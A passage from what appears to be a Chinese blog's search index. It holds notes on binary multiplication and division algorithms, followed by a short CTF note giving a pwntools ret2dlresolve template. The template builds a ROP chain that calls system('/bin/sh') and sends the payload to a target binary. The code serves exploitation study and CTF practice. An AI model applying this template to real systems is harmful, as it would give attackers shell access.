部分积加|x|， 右移两位，c变为0    · 010 -》 部分积加|x|， 右移两位，c变为0    · 011 -》 部分积加2|x|，右移两位，c变为0    · 100 -》 部分积加2|x|，右移两位，c变为0    · 101 -》 部分积减|x|， 右移两位，c变为1    · 110 -》 部分积减|x|， 右移两位，c变为1    · 111 -》 部分积加0，   右移两位，c变为1        其中减|x|等价于加[-|X|]补，因此在计算前，需要准备|X|（用三符号位）,2|X|（用三符号位）,[-|X|]补（用三符号位） 和 |Y|（用单符号位）,4.而乘数y用双符号还是单符号表示得根据乘数y的数值的奇偶性判断，而且最后一步移位与否也与乘数y的数值的奇偶性有关：    · 如果乘数y的尾数n的位数为偶数，则乘数y用双符号表示，最后一步不移位    · 如果乘数y的尾数n的位数为奇数，则乘数y用单符号表示，最后一步要移一位<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505010727.png"></p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505010730.png"></p><h3 id="定点数补码乘法"><a href="#定点数补码乘法" class="headerlink" title="定点数补码乘法"></a>定点数补码乘法</h3><p>补码乘法：符号位在运算中同时产生（不需要单独运算）</p><h4 id="定点数补码一位乘"><a href="#定点数补码一位乘" class="headerlink" title="定点数补码一位乘"></a>定点数补码一位乘</h4><h5 id="校正法"><a href="#校正法" class="headerlink" title="校正法"></a>校正法</h5><pre class="line-numbers language-none"><code class="language-none">乘数的补码 [Y]补 去掉符号位，当成正数与被乘数 [X]补 按照同原码一致的方法相乘两个n位数相乘，共做n次加法和n次移位部分积采用双符号位右移时按照补码的规则进行（左边补符号位）*乘数为负数时，最后求出的部分 +[-X]补 进行修正，但是不进行移位操作<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505012124.png"></p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505012128.png"></p><h5 id="比较法"><a href="#比较法" class="headerlink" title="比较法"></a>比较法</h5><pre class="line-numbers language-none"><code class="language-none">部分积和被乘数使用双符号位，乘数采用一位符号位需要在乘数的末位加上一位附加位，附加位初始值为0，Yn+1&#x3D;0通过比较末两位决定操作： 若Yn＋1＜Yn，部分积＋[-X]补，     若Yn＋1＝Yn，部分积＋0，     若Yn＋1＞Yn，部分积＋[X]补。          若Yn&#x3D;0，Yn+1&#x3D;0，部分积＋0，右移     若Yn&#x3D;0，Yn+1&#x3D;1，部分积＋[X]补，右移     若Yn&#x3D;1，Yn+1&#x3D;0，部分积＋[-X]补，右移     若Yn&#x3D;1，Yn+1&#x3D;1，部分积＋0，右移     最后一次加法运算不移位<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505013239.png"></p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505013145.png"></p><h4 id="定点数补码两位乘（比较法）"><a href="#定点数补码两位乘（比较法）" class="headerlink" title="定点数补码两位乘（比较法）"></a>定点数补码两位乘（比较法）</h4><pre class="line-numbers language-none"><code class="language-none">补码两位乘法，根据附加位和部分积后两位值的情况，确定下一步操作。即根据当前的Yn-1,Yn,Yn+1的值，来确定下一步的操作。组合值为（Yn+Yn+1-2*Yn-1），组合值为a，就加上a*[X]补<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505014225.png" alt="微信图片_20220505014225"></p><p>太不好解释了，直接粘贴ppt了</p><p>补码两位乘比较法规则说明</p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505014227.png"></p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505014230.png"></p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505014232.png" alt="微信图片_20220505014232"></p><h2 id="二进制除法运算"><a href="#二进制除法运算" class="headerlink" title="二进制除法运算"></a>二进制除法运算</h2><h3 id="定点原码一位除"><a href="#定点原码一位除" class="headerlink" title="定点原码一位除"></a>定点原码一位除</h3><h4 id="恢复余数法"><a href="#恢复余数法" class="headerlink" title="恢复余数法"></a>恢复余数法</h4><pre class="line-numbers language-none"><code class="language-none">符号位单独处理，C0&#x3D;X0⊕Y0,运算时采用绝对值进行运算。要求|X|&lt;|Y|,否则溢出|X|-|Y|&#x3D;R0,若R0&lt;0;商0，然后R0+|Y|,恢复余数，运算完后左移一位|X|-|Y|&#x3D;R0,若R0&gt;&#x3D;0;商1，运算完后左移一位<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>恢复余数法规则：</p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505015553.png"></p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505015555.png"></p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505015558.png"></p><h4 id="加减交替法"><a href="#加减交替法" class="headerlink" title="加减交替法"></a>加减交替法</h4><pre class="line-numbers language-none"><code class="language-none">与恢复余数法不同的是，在每次运算完成后，判断余数R0的正负。若R0&gt;&#x3D;0，上1，余数左移一位，减去|Y0|（等价于 +[-|Y0|]补 ），余数为正数，表明上一步够减，因此减去|Y0|；若R0&lt;0，上0，余数左移一位，加上|Y0|，余数为负数，表明上一步不够减，因此加上|Y0|。最开始运算为|X0|-|Y0|。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>原码一位除加减交替法规则</p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505020432.png"></p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505020435.png"></p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505020438.png"></p><h3 id="定点补码一位除"><a href="#定点补码一位除" class="headerlink" title="定点补码一位除"></a>定点补码一位除</h3><h4 id="加减交替法-1"><a href="#加减交替法-1" class="headerlink" title="加减交替法"></a>加减交替法</h4><pre class="line-numbers language-none"><code class="language-none">被除数采用双符号位，除数采用单符号位。第一步根据除数与被除数的符号来进行下一步操作：    被除数与除数同号，[X]补-[Y]补    被除数与除数异号，[X]补+[Y]补第二步（之后）根据余数和除数的符号判断下一步操作：    余除同号，上商1，左移一位，-[Y]补    余除异号，上商0，左移一位，+[Y]补补码除法求商有误差，求出来的商为反码，需要对商进行修正，一般末位恒置一余数也需要进行修正，余数与被除数符号一致。不一致时，需要恢复余数。若为正商，余除异号，[Ri+1]补+[Y]补；若为负商，余除同号，[Ri+1]补-[Y]补。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505022411.png"></p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505022414.png"></p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505022417.png"></p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505022420.png"></p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505022423.png"></p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505022426.png"></p><h4 id="比较法-1"><a href="#比较法-1" class="headerlink" title="比较法"></a>比较法</h4><pre class="line-numbers language-none"><code class="language-none">和加减交替法基本上一致，但是改进了第一步的判断。将第一步的被除数看做余数，直接与除数比较，采用统一的上商计算方法。（第一步上来就根据被除数正负上商，并左移）规则：    余除同号，上商1，左移一位，-[Y]补（减去除数）    余除异号，上商0，左移一位，+[Y]补（加上除数）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505023227.png"></p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505023230.png"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><h3 id="乘法文章推荐"><a href="#乘法文章推荐" class="headerlink" title="乘法文章推荐"></a>乘法文章推荐</h3><p><a href="https://blog.csdn.net/qq_43309315/article/details/107582972">https://blog.csdn.net/qq_43309315/article/details/107582972</a></p><h3 id="除法文章推荐"><a href="#除法文章推荐" class="headerlink" title="除法文章推荐"></a>除法文章推荐</h3><p><a href="https://blog.csdn.net/qq_45954145/article/details/118405136">https://blog.csdn.net/qq_45954145/article/details/118405136</a></p><p><a href="https://blog.csdn.net/qq_45954145/article/details/118405462">https://blog.csdn.net/qq_45954145/article/details/118405462</a></p>]]></content>
      
      
      <categories>
          
          <category> 计算机组成原理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机组成原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwntools构造ret2dlresolve模板</title>
      <link href="/posts/1010.html"/>
      <url>/posts/1010.html</url>
      
        <content type="html"><![CDATA[<h1 id="pwntools构造ret2dlresolve模板"><a href="#pwntools构造ret2dlresolve模板" class="headerlink" title="pwntools构造ret2dlresolve模板"></a>pwntools构造ret2dlresolve模板</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python">Help on class Ret2dlresolvePayload in module pwnlib.rop.ret2dlresolve:class Ret2dlresolvePayload(__builtin__.object) |  Methods defined here: |   |  __init__(self, elf, symbol, args, data_addr&#x3D;None) |   |  ---------------------------------------------------------------------- |  Data descriptors defined here: |   |  __dict__ |      dictionary for instance variables (if defined) |   |  __weakref__ |      list of weak references to the object (if defined)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>elf：相应的文件</p><p>symbol：函数名称</p><p>args：函数参数</p><p>data_addr：该payload所在的地址(默认会会放在bss比较高的地址上)</p><p>常用方法（用之前要设置context.binary和elf）</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">dlresolve &#x3D; Ret2dlresolvePayload(elf,symbol&#x3D;&quot;system&quot;,args&#x3D;[&quot;&#x2F;bin&#x2F;sh&quot;],data_addr&#x3D;0x804ad00)#data_addr直接默认也行，它会自己找到一个合适的地址<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>print(rop.dump())可以查看rop链内容</p><p>以上来自TTYflag师傅的介绍</p><p>在使用前先指定</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">rop&#x3D;ROP(&quot;.&#x2F;pwn&quot;)#pwntools模板dlresolve &#x3D; Ret2dlresolvePayload(elf, symbol&#x3D;&quot;system&quot;, args&#x3D;[&quot;&#x2F;bin&#x2F;sh&quot;])rop.read(0, dlresolve.data_addr)rop.ret2dlresolve(dlresolve)info(rop.dump()) #查看rop信息payload&#x3D;fit(&#123;0x4C: rop.chain(), 0x100: dlresolve.payload&#125;)#0x4c是写入rop链的地方，0x100是read读入的大小。#fit就是填充一下r.sendline(payload)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
